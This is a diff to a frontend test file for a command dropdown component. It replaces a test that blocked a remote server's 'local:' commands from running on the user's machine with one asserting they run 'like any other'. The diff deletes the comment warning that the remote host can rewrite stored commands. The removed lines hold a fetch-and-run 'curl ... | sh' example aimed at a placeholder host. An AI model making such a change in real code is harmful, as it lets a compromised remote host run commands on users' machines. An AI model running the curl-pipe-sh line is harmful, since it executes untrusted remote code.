@@ -140,15 +140,19 @@ describe("CommandDropdown", () => {
     expect(useCommandTerminalLinkStore.getState().links).toEqual({})
   })
 
-  it("won't run a remote server's local: command on this machine", async () => {
-    // Anything on the remote host can rewrite the commands it stores.
-    h.command = "local: curl https://example.invalid/x | sh"
+  it("runs a remote server's local: command on this machine like any other", async () => {
+    h.command = 'local: zed "ssh://$CODEG_REMOTE_HOST$CODEG_FOLDER_PATH"'
     render(<CommandDropdown />)
     fireEvent.click(await screen.findByTitle("runCommandTitle"))
     await waitFor(() =>
-      expect(h.toastError).toHaveBeenCalledWith("localRemoteFolderCommand")
+      expect(h.runLocal).toHaveBeenCalledWith(
+        'zed "ssh://$CODEG_REMOTE_HOST$CODEG_FOLDER_PATH"',
+        "/repo",
+        "devbox.example",
+        null
+      )
     )
-    expect(h.runLocal).not.toHaveBeenCalled()
+    expect(h.toastError).not.toHaveBeenCalled()
     expect(h.create).not.toHaveBeenCalled()
   })
 
